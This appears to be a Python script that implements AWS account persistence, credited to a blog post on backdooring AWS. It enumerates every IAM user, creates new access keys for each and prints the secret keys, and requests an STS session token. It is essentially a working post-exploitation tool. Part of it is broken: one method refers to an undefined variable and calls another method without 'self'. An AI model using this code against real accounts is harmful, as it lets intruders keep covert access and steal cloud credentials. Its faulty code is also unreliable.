#!/usr/bin/env python
from __future__ import print_function
import boto3
from botocore.exceptions import ClientError
import json


"""
Persistence class totally ripped off from:
https://danielgrzelak.com/backdooring-an-aws-account-da007d36f8f9#.i79n5zly6

All I did was turn this into an object! Easy right?
"""

class Persistence(object):
    def __init__(self):
        self.users = self.get_users()

    def get_users(self):
        client = boto3.client('iam')
        response = None
        user_names = []
        marker = None

        # By default, only 100 users are returned at a time.
        # 'Marker' is used for pagination.
        while (response is None or response['IsTruncated']):
            # Marker is only accepted if result was truncated.
            if marker is None:
                response = client.list_users()
            else:
                response = client.list_users(Marker=marker)

            users = response['Users']
            for user in users:
                user_names.append(user['UserName'])

            if response['IsTruncated']:
                marker = response['Marker']

        return user_names

    def backdoor_users(self):
        user_name = self.users
        tokens = []
        for user_name in user_names:
            tokens.append(backdoor_user(user_name))
        return tokens

    def backdoor_user(self, user_name):
        print(user_name)
        client = boto3.client('iam')
        try:
            response = client.create_access_key(UserName=user_name)
            print("  " + response['AccessKey']['AccessKeyId'])
            print("  " + response['AccessKey']['SecretAccessKey'])
            return response
        except ClientError as e:
            print("  " + e.response['Error']['Message'])

    def backdoor_sts(self):
        client = boto3.client('sts')
        try:
            response = client.get_session_token()
            return response
        except ClientError as e:
            pass
